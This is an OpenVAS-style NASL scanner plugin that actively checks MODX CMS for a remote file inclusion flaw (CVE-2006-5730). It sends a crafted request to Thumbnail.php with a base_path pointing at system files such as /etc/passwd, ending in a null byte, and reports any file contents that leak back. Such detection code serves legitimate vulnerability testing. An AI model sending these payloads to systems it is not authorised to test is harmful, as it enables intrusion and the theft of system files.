# SPDX-FileCopyrightText: 2008 Justin Seitz
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.80072");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
  script_tag(name:"cvss_base", value:"5.1");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2006-5730");
  script_xref(name:"OSVDB", value:"30186");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("MODX CMS < 0.9.2.2 RFI Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2008 Justin Seitz");
  script_family("Web application abuses");
  script_dependencies("gb_modx_cms_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("modx/cms/http/detected");
  script_require_ports("Services/www", 443);

  script_tag(name:"summary", value:"MODX CMS is prone to a remote file inclusion (RFI)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"MODX CMS fails to sanitize input to the 'base_path' parameter
  before using it in the 'manager/media/browser/mcpuk/connectors/php/Commands/Thumbnail.php'
  script to include PHP code.");

  script_tag(name:"impact", value:"Provided PHP's 'register_globals' setting is enabled, an
  unauthenticated attacker can exploit this issue to view arbitrary files and execute arbitrary
  code, possibly taken from third-party hosts, on the remote host.");

  script_tag(name:"solution", value:"Update to version 0.9.2.2 or later.");

  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/2706");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/20898");
  script_xref(name:"URL", value:"http://modxcms.com/forums/index.php/topic,8604.0.html");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");

cpe_list = make_list( "cpe:/a:modx:unknown",
                      "cpe:/a:modx:revolution",
                      "cpe:/a:modx:evolution" );

if( ! infos = get_app_port_from_list( cpe_list:cpe_list, service:"www" ) )
  exit( 0 );

cpe = infos["cpe"];
port = infos["port"];

if( ! dir = get_app_location( cpe:cpe, port:port ) )
  exit( 0 );

install = dir;

if( dir == "/" )
  dir = "";

files = traversal_files();

foreach pattern( keys( files ) ) {

  file = "/" + files[pattern];

  url = dir + "/manager/media/browser/mcpuk/connectors/php/Commands/Thumbnail.php?base_path=" + file + "%00";

  req = http_get( port:port, item:url );
  res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );
  if( ! res )
    continue;

  if( egrep( pattern:pattern, string:res ) ||
      string( "main(", file, "\\0manager/media/browser/mcpuk/connectors/php/Commands/Thumbnail.php): failed to open stream" ) >< res ||
      string( "main(", file, "): failed to open stream: No such file" ) >< res ||
      "open_basedir restriction in effect. File(" >< res ) {

    passwd = NULL;
    if( egrep( pattern:pattern, string:res ) ) {
      passwd = res;
      if( "<br" >< passwd )
        passwd = passwd - strstr(passwd, "<br");
    }

    if( passwd ) {
      info = string( "The version of MODX CMS installed in directory '", install, "'\n",
                     "is vulnerable to this issue. Here is the contents of " + file + "\n",
                     "from the remote host :\n\n", passwd );
    } else {
      info = http_report_vuln_url( port:port, url:url );
    }

    security_message( port:port, data:info );
    exit( 0 );
  }
}

exit( 99 );
